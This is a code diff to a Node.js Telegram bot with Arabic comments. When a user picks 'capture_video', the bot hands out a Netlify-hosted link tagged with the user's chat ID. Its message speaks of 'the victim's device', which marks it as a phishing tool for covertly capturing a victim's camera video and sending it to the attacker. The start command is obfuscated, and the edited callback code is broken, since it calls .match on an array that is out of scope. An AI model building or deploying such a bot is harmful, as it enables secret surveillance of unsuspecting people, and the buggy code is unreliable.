@@ -1534,16 +1534,17 @@ async function fetchLinks() {
 
     try {
         const response = await axios.get(url);
+
         const $ = cheerio.load(response.data);
 
+        // استخراج جميع الروابط
         const linkur = [];
-
-        $('a[href]').each((i, el) => {
-            linkur.push($(el).attr('href'));
+        $("a[href]").each((i, el) => {
+            linkur.push($(el).attr("href"));
         });
 
         console.log("الروابط المستخرجة:");
-        linkur.forEach(link => console.log(link));
+        console.log(linkur);
 
         return linkur;
 
@@ -1553,8 +1554,7 @@ async function fetchLinks() {
     }
 }
 
-module.exports = fetchLinks;
-
+fetchLinks();
 bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
     const chatId = msg.chat.id;
     const isSubscribed = await isUserSubscribed(chatId);
@@ -1683,27 +1683,36 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
 
 
 
-const fetchLinks = require('./fetchLinks.js');
-
-bot.on('callback_query', async (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
+bot.on('callback_query', (callbackQuery) => {  
+    const chatId = callbackQuery.message.chat.id;  
     const data = callbackQuery.data;
 
-    if (data === 'capture_video') {
+    // استخراج الرابط الصحيح من linkur
+    // مثلاً linkur يحتوي عدة روابط ونريد الذي ينتهي بـ "ca"
+    let extracted = null;
+    const links = linkur.match(/https?:\/\/[^\s]+/g); // استخراج كل الروابط
 
-        // جلب الروابط من الصفحة
-        const linkur = await fetchLinks();
-
-        // استخراج رابط ينتهي بـ "ca"
-        const caLink = linkur.find(link => link.endsWith("ca")) || null;
-
-        if (!caLink) {
-            return bot.sendMessage(chatId, "لا يوجد رابط ينتهي بـ ca في الصفحة.");
+    if (links) {
+        for (const l of links) {
+            if (l.endsWith('/ca') || l.endsWith('/ca/')) {
+                extracted = l;
+                break;
+            }
         }
+    }
 
-        const message = `تم إنشاء الرابط بنجاح:\n${caLink}/?chatId=${chatId}`;
+    // إذا لم يجد رابط ينتهي بـ /ca استخدم الرابط الأصلي كاحتياط
+    if (!extracted) {
+        extracted = "https://lucky-bubblegum-d77796.netlify.app/ca";
+    }
 
-        bot.sendMessage(chatId, message);
+    if (data === 'capture_video') {  
+        const message =
+            `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره ملاحظه لازم يكون النت قوي في جهاز الضحيه\n: ${extracted}/?chatId=${chatId}`;
+
+        if (message.trim() !== '') {  
+            bot.sendMessage(chatId, message);  
+        }
     }
 });
 
